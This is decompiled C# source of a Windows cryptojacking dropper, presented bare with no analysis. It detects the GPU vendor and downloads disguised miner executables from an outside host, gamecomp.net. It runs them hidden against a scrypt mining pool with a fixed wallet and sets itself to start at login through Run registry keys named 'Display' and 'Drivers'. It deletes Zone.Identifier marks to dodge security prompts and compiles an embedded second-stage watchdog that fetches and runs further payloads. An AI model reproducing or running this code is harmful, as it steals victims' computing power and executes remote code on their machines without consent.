using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.CSharp;
using Microsoft.Win32;

namespace ConsoleApplication4;

internal class Program
{
	public class pThread
	{
		public static volatile string flags;

		public static volatile string fN;

		public static volatile string exN;

		public static volatile string exe;

		public void Persist()
		{
			Thread.Sleep(5000);
			int num = 0;
			p2Thread @object = new p2Thread();
			Thread thread = new Thread(@object.Persist2);
			thread.Start();
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\md64\\taskstart.exe"))
			{
				exe = "md64.exe";
				fN = "md64";
				exN = "taskstart";
				flags = " -a scrypt -o stratum+tcp://eu.wafflepool.com:3332 -u 15vwGxH93CPqscXU4jFpCfHdJD5FsYiwGx -p d=256";
			}
			else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\nvidiadisp\\nvidiadisp.exe"))
			{
				exe = "nvidiadisp.exe";
				fN = "nvidiadisp";
				exN = "nvidiadisp";
				flags = " --algo=scrypt:2048 -o stratum+tcp://eu.wafflepool.com:3332 -O 15vwGxH93CPqscXU4jFpCfHdJD5FsYiwGx:d=256";
			}
			else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\amddriver\\amddriver.exe"))
			{
				exe = "amddriver.exe";
				fN = "amddriver";
				exN = "amddriver";
				flags = " -o stratum+tcp://eu.wafflepool.com:3332 -u 15vwGxH93CPqscXU4jFpCfHdJD5FsYiwGx -p d=256 --scrypt-vert";
			}
			else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\md32\\taskstart.exe"))
			{
				exe = "md32.exe";
				fN = "md32";
				exN = "taskstart";
				flags = " -a scrypt -o stratum+tcp://eu.wafflepool.com:3332 -u 15vwGxH93CPqscXU4jFpCfHdJD5FsYiwGx -p d=256";
			}
			do
			{
				Process[] processesByName = Process.GetProcessesByName(exN);
				if (processesByName.Length <= 0)
				{
					if (processesByName.Length == 0 && File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + fN + "\\" + exN + ".exe"))
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.CreateNoWindow = true;
						processStartInfo.UseShellExecute = false;
						processStartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + fN + "\\" + exN + ".exe";
						processStartInfo.Arguments = flags;
						processStartInfo.ErrorDialog = false;
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						num++;
						try
						{
							Process.Start(processStartInfo);
						}
						catch (Exception)
						{
						}
					}
					else if (processesByName.Length == 0 && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + fN + "\\" + exN + ".exe"))
					{
						try
						{
							downL(exe);
						}
						catch
						{
						}
					}
				}
				else
				{
					Thread.Sleep(300);
				}
			}
			while (num < 100);
		}
	}

	public class p2Thread
	{
		public string pers2 = "winvap";

		public void Persist2()
		{
			//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00de: Expected O, but got Unknown
			int num = 0;
			while (num < 100)
			{
				Process[] processesByName = Process.GetProcessesByName("winvap");
				if (processesByName.Length > 0)
				{
					Thread.Sleep(300);
				}
				else if (processesByName.Length == 0 && File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winvap.exe"))
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winvap.exe";
					processStartInfo.CreateNoWindow = true;
					processStartInfo.UseShellExecute = false;
					processStartInfo.ErrorDialog = false;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					num++;
					try
					{
						using Process process = Process.Start(processStartInfo);
						process.Start();
					}
					catch (Exception)
					{
					}
				}
				else if (processesByName.Length == 0 && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winvap.exe"))
				{
					try
					{
						Dictionary<string, string> dictionary = new Dictionary<string, string>();
						dictionary.Add("CompilerVersion", "v2.0");
						CodeDomProvider provider = (CodeDomProvider)new CSharpCodeProvider((IDictionary<string, string>)dictionary);
						CompileCode(provider, rcCode, "winvap.exe");
					}
					catch
					{
					}
				}
			}
		}
	}

	private static Mutex mutex;

	public static string rcCode = "\r\nusing System;\r\nusing System.Net;\r\nusing System.Runtime.InteropServices;\r\nusing System.Diagnostics;\r\nusing System.IO;\r\nusing System.Reflection;\r\nusing System.Threading;\r\n\r\nnamespace RDX\r\n{\r\n    public class cRDXA\r\n    {\r\n        public static volatile string c4x = \"c4sysmgr.exe\";\r\n        public static volatile string c4p = \"c4sysmgr\";\r\n        public static void Main(string[] args)\r\n        {\r\n            if (RDX.cRDXA.Run() == false)\r\n            {\r\n                return;\r\n            }\r\n            rdxThread wOb = new rdxThread();\r\n            Thread wThread = new Thread(wOb.rdxPers);\r\n            wThread.Start();\r\n            }\r\n        public class rdxThread\r\n        {\r\n            public void rdxPers()\r\n            {\r\n                Thread.Sleep(3000);\r\n            int l = 0;\r\n                while (l < 100)\r\n                {\r\n                    Process[] c4proc = Process.GetProcessesByName(\"c4sysmgr\");\r\n                    if (c4proc.Length > 0)\r\n                    {\r\n                        System.Threading.Thread.Sleep(300);\r\n                    }\r\n                    else if (c4proc.Length == 0 && File.Exists(Environment.GetFolderPath(\r\n                        Environment.SpecialFolder.ApplicationData) + \"\\\\\" +  c4x))\r\n                    {\r\n                        ProcessStartInfo startInfo = new ProcessStartInfo();\r\n                        startInfo.CreateNoWindow = false;\r\n                        startInfo.UseShellExecute = false;\r\n                        startInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \"\\\\\" + c4x;\r\n                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;\r\n                        try\r\n                        {\r\n                            using (Process exeProcess = Process.Start(startInfo))\r\n                            {\r\n                                exeProcess.WaitForExit();\r\n                            }\r\n                        }\r\n                        catch (Exception e)\r\n                        {\r\n                        }\r\n                    }\r\n                    else if (c4proc.Length == 0 && !File.Exists(Environment.GetFolderPath(\r\n                        Environment.SpecialFolder.ApplicationData) + \"\\\\\" +  c4x))\r\n                    {\r\n                        try\r\n                        {\r\n                            downL(c4x);\r\n                        }\r\n                        catch\r\n                        {\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        public static void downL(string dlName)\r\n        {\r\n            WebClient Client = new WebClient();\r\n            FileInfo filea = new FileInfo(dlName);\r\n            Client.DownloadFile(\"http://gamecomp.net/\" + filea.Name, filea.FullName);\r\n            ProcessStartInfo startInfo2 = new ProcessStartInfo();\r\n            startInfo2.CreateNoWindow = false;\r\n            startInfo2.UseShellExecute = false;\r\n            startInfo2.FileName = filea.Name;\r\n            startInfo2.WindowStyle = ProcessWindowStyle.Hidden;\r\n            int a = 0;\r\n        TryAgain: if (!IsFileLocked(filea))\r\n            {\r\n                try\r\n                {\r\n                    Process exeProcess = Process.Start(startInfo2);\r\n                    exeProcess.Start();\r\n\r\n                }\r\n                catch (Exception e)\r\n                {\r\n                }\r\n            }\r\n            else\r\n            {\r\n                try\r\n                {\r\n                    if (a == 0)\r\n                    {\r\n                        System.Threading.Thread.Sleep(7500);\r\n                        a++;\r\n                        goto TryAgain;\r\n                    }\r\n                }\r\n                catch\r\n                {\r\n                }\r\n            }\r\n        }\r\n        public static bool IsFileLocked(FileInfo file)\r\n        {\r\n            FileStream stream = null;\r\n            try\r\n            {\r\n                stream = file.Open(FileMode.Open, FileAccess.Read, FileShare.None);\r\n            }\r\n            catch\r\n            {\r\n                return true;\r\n            }\r\n            finally\r\n            {\r\n                if (stream != null)\r\n                    stream.Close();\r\n            }\r\n            return false;\r\n        }\r\n        public static bool Run()\r\n        {\r\n            if (IsAlreadyRunning())\r\n            {\r\n                return false;\r\n            }\r\n            return true;\r\n        }\r\n        private static bool IsAlreadyRunning()\r\n        {\r\n            string strLoc = Assembly.GetExecutingAssembly().Location;\r\n            FileSystemInfo fileInfo = new FileInfo(strLoc);\r\n            string pExeName = fileInfo.Name;\r\n            bool pbCreatedNew;\r\n            mutex = new Mutex(true, \"Global\\\\\" + pExeName, out pbCreatedNew);\r\n            if (pbCreatedNew)\r\n                mutex.ReleaseMutex();\r\n            return !pbCreatedNew;\r\n        }\r\n        static Mutex mutex;\r\n    }\r\n}";

	private static void Main(string[] args)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		if (!Run())
		{
			return;
		}
		startup();
		pThread @object = new pThread();
		Thread thread = new Thread(@object.Persist);
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				PropertyData val3 = ((ManagementBaseObject)val2).get_Properties().get_Item("CurrentBitsPerPixel");
				PropertyData val4 = ((ManagementBaseObject)val2).get_Properties().get_Item("Description");
				if (val3 == null || val4 == null || val3.get_Value() == null)
				{
					continue;
				}
				object propertyValue = ((ManagementBaseObject)val2).GetPropertyValue("Description");
				string text = propertyValue.ToString()!.ToUpperInvariant();
				if (text.Contains("NVIDIA"))
				{
					if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\nvidiadisp\\nvidiadisp.exe"))
					{
						thread.Start();
						continue;
					}
					downL("nvidiadisp.exe");
					thread.Start();
				}
				else if (!text.Contains("AMD") && !text.Contains("RADEON"))
				{
					if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\md64\\taskstart.exe") && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\md32\\taskstart.exe"))
					{
						if (Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")!.Contains("64"))
						{
							downL("md64.exe");
							thread.Start();
						}
						else
						{
							downL("md32.exe");
							thread.Start();
						}
					}
					else
					{
						thread.Start();
					}
				}
				else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\amddriver\\amddriver.exe"))
				{
					thread.Start();
				}
				else
				{
					downL("amddriver.exe");
					thread.Start();
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void downL(string dlName)
	{
		WebClient webClient = new WebClient();
		FileInfo fileInfo = new FileInfo(dlName);
		webClient.DownloadFile("http://gamecomp.net/" + fileInfo.Name, fileInfo.FullName);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.FileName = fileInfo.Name;
		processStartInfo.ErrorDialog = false;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		int num = 0;
		while (IsFileLocked(fileInfo))
		{
			try
			{
				if (num == 0)
				{
					Thread.Sleep(7500);
					num++;
					continue;
				}
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			Process process = Process.Start(processStartInfo);
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	public static void startup()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		FileSystemInfo fileSystemInfo = new FileInfo(location);
		string name = fileSystemInfo.Name;
		string location2 = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, name);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		try
		{
			File.Copy(location2, folderPath, overwrite: true);
		}
		catch
		{
		}
		try
		{
			registryKey.SetValue("Display", Application.get_ExecutablePath());
			registryKey.SetValue("Drivers", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + name);
		}
		catch
		{
		}
		try
		{
			zoneOut(Application.get_ExecutablePath());
			zoneOut(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + name);
		}
		catch
		{
		}
	}

	public static void CompileCode(CodeDomProvider provider, string sourceCode, string exeFile)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		CompilerParameters val = new CompilerParameters();
		val.set_GenerateExecutable(true);
		val.set_OutputAssembly(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + exeFile);
		val.set_IncludeDebugInformation(false);
		val.get_ReferencedAssemblies().Add("System.dll");
		val.set_GenerateInMemory(false);
		val.set_WarningLevel(4);
		val.set_TreatWarningsAsErrors(false);
		if (provider.Supports((GeneratorSupport)2))
		{
			val.set_MainClass("RDX.cRDXA");
		}
		CompilerResults val2 = provider.CompileAssemblyFromSource(val, new string[1] { sourceCode });
		if (((CollectionBase)(object)val2.get_Errors()).Count < 2)
		{
			try
			{
				zoneOut(val2.get_PathToAssembly());
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.CreateNoWindow = false;
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = val2.get_PathToAssembly();
				processStartInfo.ErrorDialog = false;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch
			{
			}
		}
	}

	protected static bool IsFileLocked(FileInfo file)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = file.Open(FileMode.Open, FileAccess.Read, FileShare.None);
		}
		catch (IOException)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}

	public static bool Run()
	{
		if (IsAlreadyRunning())
		{
			return false;
		}
		return true;
	}

	private static bool IsAlreadyRunning()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		FileSystemInfo fileSystemInfo = new FileInfo(location);
		string name = fileSystemInfo.Name;
		mutex = new Mutex(initiallyOwned: true, "Global\\" + name, out var createdNew);
		if (createdNew)
		{
			mutex.ReleaseMutex();
		}
		return !createdNew;
	}

	public static bool zoneOut(string fileName)
	{
		return DeleteFile(fileName + ":Zone.Identifier");
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile(string name);
}
